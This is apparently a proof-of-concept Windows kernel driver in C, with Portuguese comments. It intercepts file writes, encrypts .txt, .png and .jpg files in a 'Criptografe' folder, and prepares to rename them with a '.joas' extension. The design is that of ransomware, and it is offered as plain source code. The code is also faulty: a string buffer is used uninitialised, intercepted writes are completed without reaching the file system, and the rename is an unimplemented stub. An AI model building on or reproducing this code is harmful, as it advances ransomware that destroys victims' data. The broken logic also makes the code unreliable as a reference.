#include <ntddk.h>
#include "FileSystem.h"
#include "Crypto.h"

NTSTATUS FsInitialize(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);

    KdPrint(("Inicializando intercepta��o do sistema de arquivos.\n"));

    // Aqui voc� deve registrar os despachantes para interceptar IRPs (por exemplo, IRP_MJ_WRITE e IRP_MJ_READ)
    DriverObject->MajorFunction[IRP_MJ_WRITE] = FsInterceptWrite;
    DriverObject->MajorFunction[IRP_MJ_READ] = FsInterceptRead;

    return STATUS_SUCCESS;
}

NTSTATUS FsInterceptWrite(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
) {
    UNREFERENCED_PARAMETER(DeviceObject);

    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
    PUNICODE_STRING fileName = &irpSp->FileObject->FileName;

    FsInterceptFile(fileName);

    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS FsInterceptRead(
    _In_ PDEVICE_OBJECT DeviceObject,
    _Inout_ PIRP Irp
) {
    UNREFERENCED_PARAMETER(DeviceObject);

    // Exemplo simples para interceptar leitura
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

VOID FsUnload() {
    KdPrint(("Encerrando intercepta��o do sistema de arquivos.\n"));
}

NTSTATUS RenameFileToJoas(
    _In_ PUNICODE_STRING FilePath
) {
    UNICODE_STRING newExtension = RTL_CONSTANT_STRING(L".joas");
    UNICODE_STRING newFileName;
    NTSTATUS status;

    status = RtlAppendUnicodeStringToString(&newFileName, FilePath);
    if (!NT_SUCCESS(status)) {
        KdPrint(("Falha ao construir novo nome de arquivo\n"));
        return status;
    }

    status = RtlAppendUnicodeStringToString(&newFileName, &newExtension);
    if (!NT_SUCCESS(status)) {
        KdPrint(("Falha ao adicionar extens�o .joas\n"));
        return status;
    }

    KdPrint(("Renomeando arquivo para: %wZ\n", &newFileName));
    // Aqui voc� implementaria a chamada para renomear o arquivo
    return STATUS_SUCCESS;
}


NTSTATUS FsInterceptFile(
    _In_ PUNICODE_STRING FilePath
) {
    UNICODE_STRING targetFolder = RTL_CONSTANT_STRING(L"\\??\\C:\\Criptografe");
    UNICODE_STRING extensionTxt = RTL_CONSTANT_STRING(L".txt");
    UNICODE_STRING extensionPng = RTL_CONSTANT_STRING(L".png");
    UNICODE_STRING extensionJpg = RTL_CONSTANT_STRING(L".jpg");

    if (!RtlPrefixUnicodeString(&targetFolder, FilePath, TRUE)) {
        // Se o arquivo n�o est� na pasta alvo, ignore
        return STATUS_SUCCESS;
    }

    if (RtlSuffixUnicodeString(&extensionTxt, FilePath, TRUE) ||
        RtlSuffixUnicodeString(&extensionPng, FilePath, TRUE) ||
        RtlSuffixUnicodeString(&extensionJpg, FilePath, TRUE)) {
        KdPrint(("Interceptando arquivo: %wZ\n", FilePath));

        // Criptografar o conte�do do arquivo
        NTSTATUS status = CryptoEncryptFile(FilePath);
        if (NT_SUCCESS(status)) {
            KdPrint(("Arquivo criptografado: %wZ\n", FilePath));
        }
        else {
            KdPrint(("Falha ao criptografar: %wZ\n", FilePath));
        }
    }

    return STATUS_SUCCESS;
}

